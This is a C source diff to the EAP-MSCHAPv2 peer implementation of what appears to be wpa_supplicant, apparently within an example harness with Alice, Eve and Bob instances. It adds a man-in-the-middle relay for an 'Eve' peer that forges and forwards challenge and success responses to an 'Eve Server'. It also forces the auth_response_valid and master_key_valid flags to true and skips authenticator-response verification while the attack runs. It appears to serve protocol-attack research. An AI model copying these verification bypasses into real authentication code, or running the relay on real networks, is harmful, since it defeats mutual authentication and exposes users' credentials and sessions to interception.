@@ -338,6 +338,9 @@ static struct wpabuf * eap_mschapv2_challenge(
 					ms = (void *) (resp + sizeof(*hdr) + 1);
 					ms->mschapv2_id = req->mschapv2_id;
 
+					data->auth_response_valid = 1;
+					data->master_key_valid = 1;
+
 					self->mitm_protocol_state = 0x3;
 					k = -1;
 
@@ -347,6 +350,7 @@ static struct wpabuf * eap_mschapv2_challenge(
 						   "by forgery Challenge "
 						   "Response to Alice Server");
 				}
+				lm_state = PENDING;
 				break;
 			default:
 				lm_state = PENDING;
@@ -440,17 +444,77 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 	const u8 *pos;
 	size_t len;
 
+	enum local_mitm_state {HACK, SKIP, PENDING} lm_state = SKIP;
+
+	static int k = 10;
+
+	if (eap_example_get_instance_name(sm) == EVE_PEER) {
+		if (k > 0) {
+			--k;
+		}
+
+		if (k == 0) {
+			k = -1;
+		}
+
+		if (k == 9) {
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Init delay loop for Eve Peer");
+		}
+
+	        if (k > 0) {
+			struct instance_data * self =
+				eap_example_get_instance_data(sm);
+
+			switch(self->mitm_protocol_state) {
+			case 0x3:
+				self->mitm_data = wpabuf_alloc_copy(req, req_len);
+				self->mitm_protocol_state = 0x4;
+				eap_example_mitm_peer_tx(self);
+
+				wpa_printf(MSG_DEBUG,
+					   "MITM: Send MSCHAPv2 Success "
+					   "Auth Response to Eve Server");
+
+				lm_state = PENDING;
+				break;
+			default:
+				lm_state = PENDING;
+				break;
+			}
+		}
+
+		if (k > 0) {
+			ret->ignore = TRUE;
+			ret->decision = DECISION_FAIL;
+			eap_example_mitm_retransmit(sm);
+
+			resp = NULL;
+		}
+
+		if (k == -1) {
+			wpa_printf(MSG_DEBUG,
+				   "MITM: End delay loop for Eve Peer");
+			k = -2;
+		}
+	}
+
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Received success");
 	len = req_len - sizeof(*req);
 	pos = (const u8 *) (req + 1);
-	if (!data->auth_response_valid ||
-	    mschapv2_verify_auth_response(data->auth_response, pos, len)) {
+
+
+	/* Ignore the verification until the completion of MITM protocol */
+	if ((!data->auth_response_valid ||
+	    mschapv2_verify_auth_response(data->auth_response, pos, len)) &&
+	    lm_state == SKIP) {
 		wpa_printf(MSG_WARNING, "EAP-MSCHAPV2: Invalid authenticator "
 			   "response in success request");
 		ret->methodState = METHOD_DONE;
 		ret->decision = DECISION_FAIL;
 		return NULL;
 	}
+
 	pos += 2 + 2 * MSCHAPV2_AUTH_RESPONSE_LEN;
 	len -= 2 + 2 * MSCHAPV2_AUTH_RESPONSE_LEN;
 	while (len > 0 && *pos == ' ') {
@@ -461,26 +525,29 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 			  pos, len);
 	wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Authentication succeeded");
 
-	/* Note: Only op_code of the EAP-MSCHAPV2 header is included in success
-	 * message. */
-	resp = eap_msg_alloc(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, 1,
-			     EAP_CODE_RESPONSE, id);
-	if (resp == NULL) {
-		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Failed to allocate "
-			   "buffer for success response");
-		ret->ignore = TRUE;
-		return NULL;
+	/* Wait for the completion of MITM protocol */
+	if (lm_state == SKIP) {
+		/* Note: Only op_code of the EAP-MSCHAPV2 header is included in
+		 * success message. */
+		resp = eap_msg_alloc(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, 1,
+				     EAP_CODE_RESPONSE, id);
+		if (resp == NULL) {
+			wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Failed to allocate "
+				   "buffer for success response");
+			ret->ignore = TRUE;
+			return NULL;
+		}
+
+		wpabuf_put_u8(resp, MSCHAPV2_OP_SUCCESS); /* op_code */
+
+		ret->methodState = METHOD_DONE;
+		ret->decision = DECISION_UNCOND_SUCC;
+		ret->allowNotifications = FALSE;
+		data->success = 1;
+
+		if (data->prev_error == ERROR_PASSWD_EXPIRED)
+			eap_mschapv2_password_changed(sm, data);
 	}
-
-	wpabuf_put_u8(resp, MSCHAPV2_OP_SUCCESS); /* op_code */
-
-	ret->methodState = METHOD_DONE;
-	ret->decision = DECISION_UNCOND_SUCC;
-	ret->allowNotifications = FALSE;
-	data->success = 1;
-
-	if (data->prev_error == ERROR_PASSWD_EXPIRED)
-		eap_mschapv2_password_changed(sm, data);
 
 	return resp;
 }
